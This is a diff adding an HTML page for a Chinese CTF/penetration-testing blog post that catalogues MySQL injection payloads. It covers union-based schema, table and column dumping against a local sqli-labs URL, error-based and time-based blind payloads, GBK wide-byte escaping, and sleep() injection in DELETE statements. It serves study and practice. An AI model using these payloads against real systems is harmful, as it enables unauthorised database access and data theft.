@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+
+    
+
+    
+    <title>常见sql注入语句 | o1hy</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="sql,ctf">
+    
+    <meta name="description" content="常见的SQL注入">
+<meta name="keywords" content="sql,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见sql注入语句">
+<meta property="og:url" content="https://17307.github.io/2018/09/30/常见sql注入语句/index.html">
+<meta property="og:site_name" content="o1hy">
+<meta property="og:description" content="常见的SQL注入">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://h1.ioliu.cn/bing/WinterLynx_ZH-CN7158207296_400x240.jpg">
+<meta property="og:updated_time" content="2019-02-02T11:52:17.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="常见sql注入语句">
+<meta name="twitter:description" content="常见的SQL注入">
+<meta name="twitter:image" content="http://h1.ioliu.cn/bing/WinterLynx_ZH-CN7158207296_400x240.jpg">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/github.png">
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/3.3.1/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+    
+
+
+</head>
+</html>
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/ML-DL/">ML&DL</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/PT/">PT</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/ctf/">ctf</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/others/">others</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/others/chrome/">chrome</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/others/git/">git</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/others/indego/">indego</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/others/linux/">linux</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/papers/">papers</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/python/">python</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/web/">web</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/web/db/">db</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/web/docker/">docker</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/web/flask/">flask</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/web/nginx/">nginx</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/web/php/">php</a></li></ul></li></ul>
+                                    
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/about/index.html">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/PT/">PT</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-常见sql注入语句" class="article article-single article-type-post" itemscope="" itemprop="blogPost">
+    <div class="post-toc" id="post-toc">
+    <strong class="post-toc-title">TOC</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-爆数据库下的库-表-列"><span class="toc-text">0x00 爆数据库下的库,表,列</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-常见报错注入"><span class="toc-text">0x01 常见报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-宽字节注入"><span class="toc-text">0x02 宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-delete"><span class="toc-text">0x03 delete</span></a></li></ol>
+</div>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        常见sql注入语句
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2018/09/30/常见sql注入语句/" class="article-date">
+            <time datetime="2018-09-30T09:21:02.000Z" itemprop="datePublished">2018-09-30</time>
+        </a>
+    </div>
+
+		
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/sql/">sql</a>
+    </div>
+
+                <span id="busuanzi_container_site_pv">
+                    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+                </span>
+                <span id="busuanzi_container_page_pv">
+                    本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+                  </span>
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <p>常见的SQL注入<br><a id="more"></a></p>
+<h1 id="0x00-爆数据库下的库-表-列"><a href="#0x00-爆数据库下的库-表-列" class="headerlink" title="0x00 爆数据库下的库,表,列"></a>0x00 爆数据库下的库,表,列</h1><p><strong>爆库</strong>  </p>
+<p><code>http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1&#39; union select group_concat(schema_name),3 from information_schema.schemata -- +</code>   </p>
+<p><strong>爆表</strong>  </p>
+<p><code>http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39; -- +</code>  </p>
+<p><strong>爆字段</strong>  </p>
+<p><code>http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1&#39; union select 1,GROUP_CONCAT(column_name) from information_schema.columns where table_name=&#39;users&#39; -- a</code>  </p>
+<h1 id="0x01-常见报错注入"><a href="#0x01-常见报错注入" class="headerlink" title="0x01 常见报错注入"></a>0x01 常见报错注入</h1><ul>
+<li>rand不能和order by一起用</li>
+</ul>
+<p><code>select * from users where id=1 and (select 1 from (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))a);</code></p>
+<p><code>select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></p>
+<ul>
+<li>extractvalue（）</li>
+</ul>
+<p><code>select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code> </p>
+<p><code>select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></p>
+<ul>
+<li>基于时间的SQL盲注</li>
+</ul>
+<p><code>slect ..... union select If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))</code></p>
+<h1 id="0x02-宽字节注入"><a href="#0x02-宽字节注入" class="headerlink" title="0x02 宽字节注入"></a>0x02 宽字节注入</h1><p><strong>判断方式：</strong> </p>
+<ol>
+<li>尝试</li>
+<li>页面编码是gbk</li>
+</ol>
+<p>使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。<br>宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\’，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击.<br>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码  </p>
+<blockquote>
+<p>%df%27—&gt;(addslashes)—&gt;%df%5c%27—&gt;(GBK)—-&gt;運’ </p>
+<p>用户输入—&gt; 过滤函数–&gt; 代码层的$sql–&gt;mysql处理请求–&gt;mysql中的sql  </p>
+</blockquote>
+<p>为了避免宽字节注入，很多人使用iconv函数（能够完成各种字符集间的转换$text=iconv(“UTF-8”,”GBK”,$text);），其实这样做是有很大风险的，仍旧可以造成宽字节注入。<br>可以使用逆向思维，先找一个gbk的汉字錦,錦的utf-8编码是0xe98ca6，它的gbk编码是0xe55c,是不是已经看出来了，当传入的值是錦’，’通过addslashes转义为’(%5c%27),錦通过icov转换为%e5%5c，终止变为了%e5%5c%5c%27,不难看出%5c%5c正好把反斜杠转义，使单引号逃逸，造成注入。  </p>
+<p>iconv(“utf-8”,”gbk”,”錦”);编码转换<br>echo bin2hex($t);输出字节码</p>
+<h1 id="0x03-delete"><a href="#0x03-delete" class="headerlink" title="0x03 delete"></a>0x03 delete</h1><p>在一次delete语句的注入中，发现一个好玩的东西。<br>delete语句拼接一些语句时.只有当表中存在数据时，如下语句才会执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DELETE from dami_flash WHERE (id=3) or sleep(5);</span><br><span class="line">DELETE from dami_flash WHERE (id=3) or (select sleep(5));</span><br></pre></td></tr></table></figure></p>
+<p><br><br><br><br><br></p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="https://17307.github.io/2018/09/30/常见sql注入语句/" data-id="cjs40hsr200228kvlpycsowmi" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "o1hy"
+        },
+        "headline": "常见sql注入语句",
+        "image": "https://17307.github.iohttp://h1.ioliu.cn/bing/WinterLynx_ZH-CN7158207296_400x240.jpg",
+        "keywords": "sql ctf",
+        "genre": "PT",
+        "datePublished": "2018-09-30",
+        "dateCreated": "2018-09-30",
+        "dateModified": "2019-02-02",
+        "url": "https://17307.github.io/2018/09/30/常见sql注入语句/",
+        "description": "常见的SQL注入"
+        "wordCount": 152
+    }
+</script>
+
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/17307" target="_blank" rel="noopener">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2018/09/30/GET命令漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">newer</strong>
+        <p class="article-nav-title">
+        
+            GET命令漏洞
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/2018/09/15/Nginx配置不当/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">Nginx配置不当</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2019/02/02/chrome-extension/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/2019/02/02/chrome-extension/chrome.png)" alt="chrome-extension" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/others/">others</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/others/chrome/">chrome</a></p>
+                            <p class="item-title"><a href="/2019/02/02/chrome-extension/" class="title">chrome-extension</a></p>
+                            <p class="item-date"><time datetime="2019-02-02T13:50:15.000Z" itemprop="datePublished">2019-02-02</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/11/12/infrastructures/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://h1.ioliu.cn/bing/FortRajgad_ZH-CN7621203821_400x240.jpg)" alt="Graph-theoretic characterization of cyber-threat infrastructures" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/papers/">papers</a></p>
+                            <p class="item-title"><a href="/2018/11/12/infrastructures/" class="title">Graph-theoretic characterization of cyber-threat infrastructures</a></p>
+                            <p class="item-date"><time datetime="2018-11-12T08:30:45.000Z" itemprop="datePublished">2018-11-12</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/10/28/Metadata/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://h1.ioliu.cn/bing/ApfelTag_ZH-CN7906570680_400x240.jpg)" alt="Identifying People by Metadata" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/papers/">papers</a></p>
+                            <p class="item-title"><a href="/2018/10/28/Metadata/" class="title">Identifying People by Metadata</a></p>
+                            <p class="item-date"><time datetime="2018-10-28T02:55:15.000Z" itemprop="datePublished">2018-10-28</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/10/28/nginx-flask/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://h1.ioliu.cn/bing/MinnewankaBoathouse_ZH-CN0548323518_400x240.jpg)" alt="nginx-flask" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/web/nginx/">nginx</a></p>
+                            <p class="item-title"><a href="/2018/10/28/nginx-flask/" class="title">nginx-flask</a></p>
+                            <p class="item-date"><time datetime="2018-10-28T02:48:58.000Z" itemprop="datePublished">2018-10-28</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/10/28/docker/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://h1.ioliu.cn/bing/HoaryMarmot_ZH-CN7175843832_400x240.jpg)" alt="docker" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/web/docker/">docker</a></p>
+                            <p class="item-title"><a href="/2018/10/28/docker/" class="title">docker</a></p>
+                            <p class="item-date"><time datetime="2018-10-28T02:46:48.000Z" itemprop="datePublished">2018-10-28</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">categories</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ML-DL/">ML&DL</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PT/">PT</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/">others</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/others/chrome/">chrome</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/git/">git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/indego/">indego</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/linux/">linux</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/papers/">papers</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/db/">db</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/docker/">docker</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/flask/">flask</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/nginx/">nginx</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/php/">php</a><span class="category-list-count">1</span></li></ul></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a><span class="archive-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">tags</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/chrome/">chrome</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5碰撞/">md5碰撞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metadata/">metadata</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php反序列化/">php反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含/">文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流量包分析/">流量包分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a><span class="tag-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">links</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="https://das.scusec.org/">DAS</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <a id="back-to-top" onclick="goTop()"><i class="icon fa fa-angle-up"></i></a>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2019 o1hy</p>
+                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
+            </div>
+            <div class="footer-plugins">
+              
+    
+
+
+            </div>
+        </div>
+    </div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</footer>
+
+        
+    
+    <script>
+    var disqus_shortname = '17307';
+    
+    
+    var disqus_url = 'https://17307.github.io/2018/09/30/常见sql注入语句/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+    
+    
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
+<script>
+    function goTop() {
+        $('body, html').animate({ scrollTop: 0 }, 600);
+    }
+</script>
